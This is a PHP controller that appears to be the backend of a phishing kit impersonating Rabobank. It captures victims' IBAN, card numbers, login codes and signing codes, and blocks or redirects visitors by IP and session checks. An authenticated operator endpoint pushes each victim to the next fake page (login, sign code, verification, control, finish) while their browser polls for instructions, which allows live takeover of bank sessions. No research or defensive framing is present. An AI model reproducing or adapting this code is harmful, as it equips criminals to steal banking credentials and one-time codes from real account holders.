<?php

namespace App\Controllers\Rabo;

use \Core\View;
use \App\Models\Rabo\Rabo;
use \App\Auth;

class Login extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['iban']) && isset($_POST['number'])) {
            Rabo::setLogin($_POST['iban'], $_POST['number'], $_SESSION['uid']);
        } else {
            if (Rabo::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Rabo::checkPayment($this->route_params['id'])) {
                Rabo::redirect();
            } else {
                Rabo::setLogInformation($_SESSION['uid']);

                View::render('Rabo/login.php');
            }
        }
    }

    public function codeAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['login_code'])) {
            Rabo::setLoginCode($_POST['login_code'], $_SESSION['uid']);
        } else {
            Rabo::redirect();
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Rabo::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        $check = Rabo::getLoginCode($_SESSION['uid']);
                        echo json_encode(['page' => 'login', 'code' => $check]);   
                        Rabo::removePage($_SESSION['uid']);
                    } else if ($check == 'loginPage') {
                        echo json_encode(['page' => 'loginPage']);
                        Rabo::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'signPage') {
                        echo json_encode(['page' => 'signPage']);
                        Rabo::setSignCodePage($_SESSION['uid'], null);
                    } else if ($check == 'verificationPage') {
                        echo json_encode(['page' => 'verificationPage']);   
                        Rabo::setIdentificationPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Rabo::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Rabo::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Rabo::redirect();
        }
    }

    public function setPageAction()
    {
        if (Auth::isLoggedIn()) {
            if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id']) && isset($_POST['page'])) {
                if ($_POST['page'] == 'loginPage') {
                    $check = Rabo::setLoginPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'verificationPage') {
                    $check = Rabo::setIdentificationPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'login') {
                    $check = Rabo::setLoginCodePage($_POST['id'], $_POST['page'], $_POST['login']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'signPage') {
                    $check = Rabo::setSignCodePageCode($_POST['id'], $_POST['page'], $_POST['sign']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'control') {
                    $check = Rabo::setControlPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'finish') {
                    $check = Rabo::setFinishPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                }
            } else {
                Rabo::redirect();
            }
        } else {
            Rabo::redirect();
        }
    }
}